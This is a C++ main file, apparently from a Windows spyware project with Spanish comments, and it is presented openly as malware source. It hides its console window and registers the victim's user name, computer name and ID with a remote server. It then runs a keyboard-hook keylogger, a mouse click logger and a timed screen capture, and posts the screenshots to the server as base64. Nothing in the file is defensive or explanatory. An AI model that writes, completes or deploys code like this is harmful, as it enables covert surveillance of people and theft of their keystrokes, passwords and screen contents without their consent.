// Spy.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//Clases
#include "Date.h"
#include "Time.h"
#include "WindowsData.h"
#include "Build.h"
#include "Chronometer.h"
#include "Screenshot.h"
#include "httpRequest.h"
#include "ConfigReader.h"
#include "KeyboardHook.h"
#include <process.h>
#include "MouseHook.h"




void myScreen(void* data) {
	WindowsData info = WindowsData();
	Build directory = Build(info.getUserNamer());
	ConfigReader myConfig = ConfigReader(directory.getPath());
	if (myConfig.getValue("Screen_Time").compare("on") == 0) {
		Date date = Date();
		Time hour = Time();
		std::stringstream intValue(myConfig.getValue("Timer"));
		int number = 0;
		intValue >> number;
		Screenshot screen = Screenshot(directory.getPathImage());
		Chronometer time = Chronometer(number);
		std::string nameFile;
		std::cout << "Iniciando temporizador...." << std::endl;
		while (true) {
			if (time.alarmChrono()) {
				date.setDateInt();
				hour.setTimeInt();
				nameFile = date.getNumbers() + "-" + hour.getNumbers() + "- TIME";
				screen.saveJpeg(nameFile);
				std::string content = "data:image/jpeg;base64,";
				httpRequest post = httpRequest();
				if (screen.getBase64(nameFile).compare("empty") != 0) {
					content += screen.getBase64(nameFile);
					post.RequestRecord("Time Screenshot", "Windows", date.getNow(), hour.getNow(), "screenshot", content, info.getID());
				}
				time.setAlarm();
			}
		}
	}
}

void myKeylogger(void* data) {
	WindowsData info = WindowsData();
	Build directory = Build(info.getUserNamer());
	ConfigReader myConfig = ConfigReader(directory.getPath());
	if (myConfig.getValue("KeyStroke").compare("on") == 0) {
		std::cout << "iniciando keylogger..." << std::endl;
		KeyboardHook::Instance().InstallHook();
		KeyboardHook::Instance().Messsages();
	}
}

void myClicklogger(void* data) {
	WindowsData info = WindowsData();
	Build directory = Build(info.getUserNamer());
	ConfigReader myConfig = ConfigReader(directory.getPath());
	if (myConfig.getValue("Capture_Mouse").compare("on") == 0) {
		std::cout << "iniciando ClickLogger..." << std::endl;
		MouseHook::Instance().InstallHook();
		MouseHook::Instance().Messsages();
	}
}

int main()
{
	// Inicio del keylogger
	/// Verificar directorios y archivo de configuracion
	HWND myConsole = GetConsoleWindow();
	ShowWindow(myConsole, 0);

	WindowsData data = WindowsData();
	Build directory = Build(data.getUserNamer());
	if (!directory.existConfig()) {
		Date date = Date();
		Time time = Time();
		directory.CreateDirectorySpy();
		directory.CreateFileConfig(data.getUserNamer(), data.getComputerName(), data.getID(), date.getNow(), time.getNow());
		httpRequest post = httpRequest();
		post.RequestClient(data.getID(), data.getUserNamer(), data.getComputerName());
	}

	HANDLE hStart, hKeylogger, hScreen, hMouse;
	
	hKeylogger = (HANDLE)_beginthread(&myKeylogger, 0, 0);
	hMouse = (HANDLE)_beginthread(&myClicklogger, 0, 0);
	hScreen = (HANDLE)_beginthread(&myScreen, 0, 0);
	WaitForSingleObject(hKeylogger, INFINITE);
	WaitForSingleObject(hMouse, INFINITE);
	WaitForSingleObject(hScreen, INFINITE);
	
	return 0;
}
